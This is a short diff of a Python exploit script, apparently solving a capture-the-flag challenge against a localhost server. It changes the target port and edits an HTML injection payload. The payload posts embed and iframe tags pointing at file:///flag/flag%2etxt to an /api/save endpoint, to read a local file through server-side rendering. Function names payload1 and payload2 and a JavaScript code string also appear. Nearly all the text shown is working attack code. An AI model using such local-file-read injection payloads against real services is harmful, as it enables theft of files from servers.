@@ -2,7 +2,7 @@ import requests
 import time
 import fitz
 
-HOST = "http://localhost:8080"
+HOST = "http://localhost:3000"
 
 def payload1():
     jsCode = """
@@ -72,7 +72,7 @@ def payload2():
 
 def payload3():
     data = {
-        "code": '<embed src="file:///flag/flag%2etxt"></embed><iframe src="file:///flag/flag%2etxt"></iframe>',
+        "code": '<embed width="100%" src="file:///flag/flag%2etxt"></embed><iframe src="file:///flag/flag%2etxt"></iframe>',
         "target": "code/inj3ct10NNNNN"
     }
     resp = requests.post(f"{HOST}/api/save", json=data)
